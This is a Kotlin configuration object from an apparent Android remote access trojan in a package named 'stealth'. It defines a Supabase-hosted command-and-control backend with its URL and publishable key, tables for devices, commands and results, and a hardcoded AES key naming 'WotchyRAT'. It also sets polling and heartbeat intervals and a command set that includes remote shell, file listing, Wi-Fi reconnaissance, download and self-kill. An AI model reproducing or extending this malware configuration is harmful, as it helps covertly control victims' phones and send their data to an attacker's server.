package com.kaze.stealth

object Config {
    const val SUPABASE_URL = "https://mzlxjobibskxhgywszff.supabase.co"
    const val SUPABASE_KEY = "sb_publishable_nKC_zzEY-e0szNHRGqy7ag_EAMQNYCW"
    const val SUPABASE_REST = "$SUPABASE_URL/rest/v1"

    const val TABLE_DEVICES = "c2_devices"
    const val TABLE_COMMANDS = "c2_commands"
    const val TABLE_RESULTS = "c2_results"

    val AES_KEY = "WotchyRAT2026!!!".toByteArray()
    const val POLL_INTERVAL_MS = 10000L
    const val MAX_SHELL_OUTPUT = 102400
    const val MAX_FILE_LIST = 500
    const val HEARTBEAT_INTERVAL_MS = 60000L
    const val MAX_COMMAND_AGE_MS = 5 * 60 * 1000L // 5 minutes — ignore stale commands

    val ALLOWED_COMMANDS = setOf(
        "info", "apps", "shell", "battery", "files", "wifi", "recon", "download", "die"
    )
}
